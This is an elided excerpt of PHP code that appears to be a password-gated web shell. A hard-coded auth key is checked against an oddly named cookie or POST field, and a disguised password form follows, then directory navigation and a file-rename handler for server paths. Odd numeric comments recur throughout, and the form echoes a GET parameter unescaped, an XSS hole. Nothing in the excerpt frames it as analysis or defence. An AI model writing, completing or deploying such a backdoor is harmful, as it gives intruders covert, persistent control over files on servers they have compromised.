...
$auth_key = "0481c3c633cbb81d248565f0da1de384";
...
$pass = false;
if (isset($_COOKIE['pw_name_30573'])) {
    if(($_COOKIE['pw_name_30573']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_30573'])) {
        if(($_POST['pw_name_30573']) == $auth_key) {
            setcookie("pw_name_30573", $_POST['pw_name_30573']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_30573' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739165835858901 1739165835735830 1739165835276925 1739165835439658
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739165835858901 1739165835735830 1739165835276925 1739165835439658
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739165835858901 1739165835735830 1739165835276925 1739165835439658
            $name = PATH . "/" . $_GET['r'];
